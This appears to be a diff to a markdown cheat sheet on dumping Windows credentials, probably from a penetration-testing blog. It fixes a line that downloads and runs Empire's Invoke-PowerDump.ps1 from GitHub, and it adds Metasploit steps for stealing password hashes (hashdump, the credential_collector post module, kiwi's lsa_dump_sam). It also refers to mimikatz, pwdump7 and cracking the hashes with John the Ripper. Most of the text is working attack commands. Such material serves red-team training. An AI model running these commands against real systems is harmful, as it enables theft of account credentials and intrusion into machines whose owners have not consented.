@@ -104,7 +104,7 @@ pwdump7.exe
 
 ## Invoke-PowerDump.ps1
 ```
- download:https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
+download:https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
 Import-Module .\Invoke-PowerDump.ps1
 Invoke-PowerDump
 ```
@@ -137,6 +137,29 @@ lsadump::sam
 
 <img src="/img/cred1/z2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+## Metasploit Framework: HashDump
+```
+hashdump
+```
+<img src="/img/cred1/hashdump.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+
+## Metasploit Framework: credential_collector
+```
+use post/windows/gather/credentials/credential_collector
+set session n
+exploit
+```
+
+<img src="/img/cred1/collect.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+## Metasploit Framework: load kiwi
+```
+load kiwi
+lsa_dump_sam
+```
+
+<img src="/img/cred1/kiwi.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## Decrypting Hash
 John The Ripper
